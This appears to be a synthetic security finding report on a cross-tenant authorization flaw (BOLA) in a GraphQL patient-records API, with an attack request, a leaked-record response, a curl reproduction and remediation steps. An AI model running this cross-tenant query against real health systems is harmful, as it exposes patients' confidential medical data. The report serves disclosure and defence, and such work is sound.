# Security Analysis Report

**System:** PatientCore EHR API — v2.4.0 (FINAL)
**Domain:** Healthcare / EHR Platform
**Example ID:** GQL-0251
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.10 | Cross-service identity propagation drift exposes PHI patient records |

---

## Finding 1 — BOLA: Cross-Service Identity Drift on Patient Lookup

### Summary
The `getPatient` GraphQL resolver fetches patient records by `patientId` without re-validating the caller's tenant identity as it propagates across internal microservices. An attacker authenticated to `tenant-b355` can retrieve patient `P-2251` belonging to `tenant-5f01` because the downstream service trusts the forwarded identity token without asserting the tenant boundary. This is documented in §4.0 RISK-GQL-251 and Pattern 1.10 (§5.0) of the provided context.txt. In a healthcare EHR platform, this constitutes a PHI breach.

### Evidence from HAR

**Request — Attack (§6.0)**
```
POST https://api.patientcore-ehr-api.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-b355
Content-Type: application/json

{"query": "query VulnerableOp { getPatient(id: \"P-2251\") { patientId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id: req-b3555f01` is a server-assigned **response** header (§6.0 response.headers). It is not part of the attack request.

**Response — Victim PHI Returned**
```json
{
  "data": {
    "getPatient": {
      "tenantId": "tenant-5f01",
      "ownerId": "other-user-b3555f01",
      "data": {
        "sensitiveField": "CONFIDENTIAL-b3555f01",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `patientId` only — no tenant dimension |
| §3.0 Schema | `getPatient(id: ID!)` — no tenant guard in schema definition |
| §4.0 RISK-GQL-251 | Resolver fetches by `patientId` only; identity drift across services |
| §5.0 Pattern 1.10 | Cross-service identity propagation drift confirmed |
| HAR request | Attacker `tenant-b355` queries `P-2251` owned by `tenant-5f01` |
| HAR response | PHI (`CONFIDENTIAL-b3555f01`) and `internalNotes` from victim tenant returned |

---

## Steps to Reproduce

```bash
# Step 1 — Authenticate as attacker (tenant-b355)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Step 2 — Query victim patient P-2251
# x-request-id is server-assigned and appears in the response only; not sent in the request
curl -s -X POST https://api.patientcore-ehr-api.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-b355" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getPatient(id: \"P-2251\") { patientId tenantId ownerId data { sensitiveField internalNotes } } }"}'

# Expected (vulnerable): Returns CONFIDENTIAL-b3555f01 (PHI) and internalNotes from tenant-5f01
# Expected (secure): Returns authorization error — "Not authorized to access patient P-2251"
```

---

## Remediation

1. **Resolver ownership check:** In `getPatient`, after fetching by `patientId`, assert `record.tenantId === $jwt.tenantId`; return 403 if mismatch.
2. **Cross-service identity re-validation:** At every service boundary, re-verify the tenant claim from the original JWT — do not trust forwarded `x-tenant-id` headers as authoritative.
3. **Cache keying:** Include `tenantId` in the Redis cache key: `patient:{tenantId}:{patientId}`.
4. **PHI field restriction:** Apply field-level access control — `internalNotes` and other PHI fields must require explicit read scope in the JWT.
5. **Audit logging:** All cross-tenant patient record access attempts must be logged with `patientId`, `requestingTenantId`, and `x-request-id` for HIPAA audit trail.
